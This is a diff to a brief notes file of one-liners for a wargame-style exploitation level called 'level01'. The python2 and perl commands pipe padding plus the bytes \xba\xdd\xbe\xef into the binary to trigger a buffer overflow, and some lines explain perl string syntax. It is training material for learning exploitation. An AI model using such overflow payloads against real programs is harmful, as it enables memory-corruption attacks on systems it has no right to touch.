@@ -2,17 +2,16 @@ Commands that make this a lot easier
 =====================================
 
 Run level01 with the output of a python command
-    ./level01 $(python2 -c 'print("A"*112)')
+    python2 -c 'print("A"*60)' | ./level01
 
 
 Use Python2 to print bytes
     python2 -c 'print("A"*64 + "\xba\xdd\xbe\xef")' | ./level01
 
 
-Do it with perl (good to know since python3 encoding makes one liners awkward)
-    perl -e 'print "A"x64 . "\xba\xdd\xbe\xef". "\n"' | ./level01
+Do it with perl:
+    perl -e 'print "A"x64 . "\xba\xdd\xbe\xef"' | ./level01
 
-*Note the "\n" at the end. Perl's print function doesn't send a new line unless specified.
-**Note that periods (.) replace (+) in perl when concatenating strings. No clue why
+*Note: unlike python, perl concatenates using periods(.) rather than plus symbols (+) 
 
 
